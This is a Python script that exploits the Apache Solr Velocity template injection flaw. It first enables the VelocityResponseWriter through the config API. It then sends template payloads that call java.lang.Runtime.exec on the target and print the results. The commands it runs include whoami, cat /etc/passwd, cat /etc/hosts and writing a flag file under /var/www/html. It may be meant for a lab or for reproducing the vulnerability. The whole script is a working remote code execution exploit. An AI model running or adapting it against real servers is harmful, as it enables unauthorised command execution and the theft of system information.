import os
import time

import requests

target_url = os.environ.get("TARGET_URL", None)

if target_url is None:
    print("TARGET_URL is not set")
    exit(1)


print(target_url)


def execute(cmd: str):
    print(f"Executing command: {cmd}")

    import urllib.parse

    cmd = urllib.parse.quote(cmd)
    print(cmd)

    path = f"{target_url}/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{cmd}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36",
    }
    res = requests.get(path, headers=headers)
    print(res.text)


def init():
    res = requests.get(f"{target_url}/admin/cores?indexInfo=false&wt=json")
    print(res.json())

    time.sleep(1)

    res = requests.post(
        f"{target_url}/demo/config",
        json={
            "update-queryresponsewriter": {
                "startup": "lazy",
                "name": "velocity",
                "class": "solr.VelocityResponseWriter",
                "template.base.dir": "",
                "solr.resource.loader.enabled": "true",
                "params.resource.loader.enabled": "true",
            }
        },
    )
    print(res.json())


cmds = [
    "init",
    "ls -alh .",
    "whoami",
    "pwd",
    "cat /etc/passwd",
    "cat /etc/hosts",
    "touch try_to_write",
    "echo flag > /var/www/html/flag",
    "mkdir /tmp/check",
]


all_time = 10
sleep_time = all_time // len(cmds)

for cmd in cmds:
    print(f"sleeping for {sleep_time}.")
    time.sleep(sleep_time)
    if cmd == "init":
        init()
    else:
        execute(cmd)

print(f"sleeping for {sleep_time}.")
time.sleep(sleep_time)
